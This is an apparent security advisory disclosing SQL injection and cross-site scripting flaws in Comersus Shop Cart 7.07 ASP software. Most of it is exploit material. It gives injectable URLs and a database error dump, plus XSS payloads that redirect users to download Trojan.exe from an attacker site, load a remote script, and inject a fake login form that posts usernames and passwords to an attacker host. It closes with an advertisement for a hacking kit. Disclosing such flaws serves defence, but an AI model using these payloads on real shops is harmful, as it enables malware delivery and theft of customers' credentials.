 ---> Comersus Shop Cart 7.07 SQL Injection & XSS

Comersus is an active server pages (asp) software for running shopping stores, integrated with the rest of your web site. Comersus ASP Cart is free and IT CAN BE used for commercial purposes. An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.


Hackers Center Security Group (http://www.hackerscenter.com)
Credit: Doz

Remote: YES
Class: Cross Site Scripting

Vendor: http://www.comersus.com
Product Tested: Comersus Cart 7.07

* Previous versions are also affected & so might 7.08!


Attackers can exploit these issues via a web client.


SQL Hole: /store/comersus_optReviewReadExec.asp?idProduct='

------------------------------------------------------------
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'

[Microsoft][ODBC Microsoft Access Driver] Syntax error (missing operator) in query expression 'idProduct=&#39'.

/demo707/includes/databaseFunctions.asp, line 38
------------------------------------------------------------


Cross Site Scripting Pages:

/comersus_customerAuthenticateForm.asp

/comersus_message.asp


Exploit:

1.
path/store/comersus_customerAuthenticateForm.asp?redirectUrl=comersus_customerS
howOrders.asp/XSS

or

/path/store/comersus_customerAuthenticateForm.asp?redirectUrl=comersus_customer
ShowOrders.asp=XSS


2.
http://www.site.com/path/store/comersus_message.asp?message=XSS


Posible Cross Site Scripting Exploits


1. Trojan or Worms!

https://www.site.com/path/store/comersus_customerAuthenticateForm.asp?redirectU
rl="><script>window.location="http://www.Evil_Site.com/Trojan.exe"</script>

2. Any Remote Script!

http://www.site.com/path/store/comersus_message.asp?message=<script
src=http://www.Site.com/Evil_Script.js></script>

3. Phishing!

http://www.site.com/path/store/comersus_message.asp?message=<form%20action="htt
p://www.Evil_Site.com/Steal_Info.asp"%20method="post">Username:<input%20name="u
sername"%20type="text"%20maxlength="10"><br>Password:<input%20name="password"%2
0type="text"%20maxlength="10"><br><input%20name="login"%20type="submit"%20value
="Login"></form>


Pic: http://i15.tinypic.com/4xzcd92.jpg



Only becoming a hacker you can stop a hacker. Were can you learn with out having to pay thousands!- http://kit.hackerscenter.com - The most comprehensive security pack you will ever find on the net!
